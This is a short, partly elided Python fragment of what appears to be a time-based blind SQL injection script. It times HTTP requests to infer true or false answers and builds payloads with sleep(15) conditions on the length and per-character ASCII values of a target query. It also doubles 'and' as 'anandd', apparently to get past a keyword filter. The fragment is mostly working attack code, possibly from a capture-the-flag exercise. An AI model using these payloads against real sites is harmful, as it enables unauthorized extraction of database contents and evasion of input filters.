...
def check_response(test_url):
    ...
    request_times += 1
    try:
        rep = requests.get(test_url, timeout = 3)
    except Exception:
        return True
    return False
...
def get_target(targetStr):
    global request_times
    request_times = 0
    inTargetLen = f"1 anandd if(length(({targetStr}))<=" + "{len}, sleep(15), 0)"
    inTarget = f"1 anandd if(ascii(substr(({targetStr})," + " {ind}, 1))<={val}, sleep(15), 0)"
